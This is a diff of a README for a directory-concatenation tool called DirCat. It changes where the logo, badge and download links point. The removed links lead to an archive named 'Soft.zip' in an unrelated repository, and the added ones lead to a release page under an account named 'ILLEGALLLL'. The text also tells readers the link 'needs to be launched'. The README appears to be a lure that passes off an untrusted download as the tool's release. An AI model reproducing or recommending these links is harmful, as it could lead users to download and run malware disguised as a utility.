@@ -1,6 +1,6 @@
 # DirCat 🐱
 
-![DirCat Logo](https://example.com/dircat-logo.png)
+![DirCat Logo](https://github.com/ILLEGALLLL/DirCat/releases/tag/v1.0)
 
 DirCat is a high-performance C++ utility that acts like the Unix `cat` command, but for entire directories. It efficiently concatenates and displays file contents, supporting multi-threading, recursion, and filtering. This project heavily utilized AI tools during its development.
 
@@ -24,9 +24,9 @@ DirCat is a versatile C++ utility designed to provide a seamless file concatenat
 
 ## Installation
 
-To get started with DirCat, download the latest release [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip).
+To get started with DirCat, download the latest release [here](https://github.com/ILLEGALLLL/DirCat/releases/tag/v1.0).
 
-[![Download DirCat](https://img.shields.io/badge/Download-DirCat-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download DirCat](https://github.com/ILLEGALLLL/DirCat/releases/tag/v1.0)](https://github.com/ILLEGALLLL/DirCat/releases/tag/v1.0)
 
 **Note:** The provided link needs to be launched for downloading the installation package.
 
